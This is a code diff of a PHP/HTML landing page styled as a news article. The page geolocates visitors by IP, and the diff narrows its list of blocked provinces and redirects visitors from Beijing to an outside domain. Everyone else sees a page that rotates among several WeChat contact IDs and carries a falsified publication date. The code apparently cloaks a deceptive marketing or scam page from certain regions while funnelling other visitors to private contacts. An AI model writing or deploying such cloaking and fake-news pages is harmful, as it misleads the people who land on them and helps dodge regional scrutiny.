@@ -8,11 +8,11 @@ if($_SERVER['SERVER_NAME']=='hhheven.cn'){
 ?>
 <script type="text/javascript" src="http://ip.ws.126.net/ipquery" ></script>
 <script type="text/javascript">
-    var prov_arr = new Array("北京市","广东省",);//这里是需要屏蔽的省份数组
+    var prov_arr = new Array("北京市");//这里是需要屏蔽的省份数组
     if (contains(prov_arr, lo)) {
         //在设定区域,不跳转
 //        alert('你在'+lo);
-        window.location.href = '/kgcy/';      
+        window.location.href = 'http://qo65i.cn/kgcy/';      
     } else {
         //不在设定区域,跳转到指定网站
         //window.location.href = 'http://guangdongxiao.cn/JF/T';
@@ -27,6 +27,7 @@ if($_SERVER['SERVER_NAME']=='hhheven.cn'){
         return false;
     }
 </script>
+
 <!-- saved from url=(0025)http://tz42b.vip0021.com/ -->
 <html lang="en" data-dpr="2" style="font-size: 23.4375px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
@@ -39,9 +40,10 @@ if($_SERVER['SERVER_NAME']=='hhheven.cn'){
     <link href="http://img.heven.top/sm31872/index_files/swiper.min.css" rel="stylesheet">
 	<script src="http://img.heven.top/sm31872/index_files/jquery.min.js.下载"></script>   
     <script>
-  //  arr_wx =["Gdd712"];
-    arr_wx = ["vvgs943","azpm1903","sm32233"];
-    var wx_index = Math.floor((Math.random() * arr_wx.length));
+    //arr_wx =["SM22093","sm33698","sm44721","sm52049"];
+//arr_wx =["sm77022","sm73735","QTY448","sm56813"]    
+arr_wx = ["ssfw6580","tzsl7699","xz300312"];
+var wx_index = Math.floor((Math.random() * arr_wx.length));
     var stxlwx = arr_wx[wx_index];
     localStorage.setItem("stxlwx", stxlwx);
     </script>
@@ -347,7 +349,7 @@ li {
 			   
     <span style=" font-size: 0.7rem; color:#000;vertical-align: bottom;">头条新闻网 </span>
 			   <br>
-			<span>2019年09月01日 23:06:35</span>
+			<span>2019年10月01日 23:06:35</span>
 			   </p>
 			  
 			    <div class="share_box-1oLcdMMp">
